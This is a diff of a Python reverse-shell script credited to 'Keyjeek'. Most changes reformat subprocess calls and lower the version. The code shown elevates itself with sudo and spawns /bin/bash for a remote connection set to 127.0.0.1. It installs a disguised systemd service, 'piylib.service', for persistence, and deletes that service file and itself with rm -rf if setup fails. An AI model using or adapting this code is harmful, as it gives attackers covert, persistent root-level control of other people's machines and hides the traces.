@@ -13,7 +13,7 @@ import os
 #   Author  :   Keyjeek                   #
 #   Contact :   nomotikag33n@gmail.com    #
 #   Github  :   @Keyj33k                  #
-#   Version :   1.0.6                     #
+#   Version :   1.0.5                     #
 #                                         #
 # # # # # # # # # # # # # # # # # # # # # #
 
@@ -61,23 +61,28 @@ class Shell:
             )
 
             """
+            
             Try this code below if you have any issues.
+            
             run(
                 [
                     "/bin/bash"
                 ], 
                 shell=True
             )
+            
             """
     
     @staticmethod
     def create_persis(file_path):
         if not os.path.isfile(file_path):
-            subprocess.run([
-                "sudo",
-                "touch",
-                file_path
-            ])
+            subprocess.run(
+                [
+                    "sudo",
+                    "touch",
+                    file_path
+                ]
+            )
 
         if os.path.isfile(file_path):
             create_service = f"[Unit]\nDescription=python service\nAfter=network.service\n\n[Service]\nType=simple\nExecStart=/usr/bin/env python3 {start_directory}\nUser={user}\n\n[Install]\nWantedBy=multi-user.target"
@@ -85,26 +90,32 @@ class Shell:
                 servfile.write(create_service)
 
         try:
-            subprocess.call([
-                "systemctl",
-                "daemon-reload"
-            ])
+            subprocess.call(
+                [
+                    "systemctl",
+                    "daemon-reload"
+                ]
+            )
 
             time.sleep(1.5)
 
-            subprocess.call([
-                "systemctl",
-                "enable",
-                "piylib.service"
-            ])
+            subprocess.call(
+                [
+                    "systemctl",
+                    "enable",
+                    "piylib.service"
+                ]
+            )
 
             time.sleep(1.5)
 
-            subprocess.call([
-                "systemctl",
-                "start",
-                "piylib.service"
-            ])
+            subprocess.call(
+                [
+                    "systemctl",
+                    "start",
+                    "piylib.service"
+                ]
+            )
 
         except subprocess.CalledProcessError:
             try:
@@ -114,19 +125,23 @@ class Shell:
                 time.sleep(1.5)
                 os.system("systemctl start piylib.service")
             except IOError:
-                subprocess.run([
-                    "rm",
-                    "-rf",
-                    file_path
-                ])
+                subprocess.run(
+                    [
+                        "rm",
+                        "-rf",
+                        file_path
+                    ]
+                )
 
                 time.sleep(0.5)
 
-                subprocess.run([
-                    "rm",
-                    "-rf",
-                    __file__
-                ])
+                subprocess.run(
+                    [
+                        "rm",
+                        "-rf",
+                        __file__
+                    ]
+                )
 
 
 
@@ -134,12 +149,14 @@ if __name__ == "__main__":
     os.system('clear')
 
     if "SUDO_UID" not in os.environ.keys():
-        subprocess.run([
-            "sudo",
-            "python3",
-            __file__,
-            "&"
-        ])
+        subprocess.run(
+            [
+                "sudo",
+                "python3",
+                __file__,
+                "&"
+            ]
+        )
 
     reverse_connection = Shell(
         "127.0.0.1",
@@ -148,3 +165,4 @@ if __name__ == "__main__":
 
     reverse_connection.create_persis("/etc/systemd/system/piylib.service")
     reverse_connection.shell()
+    
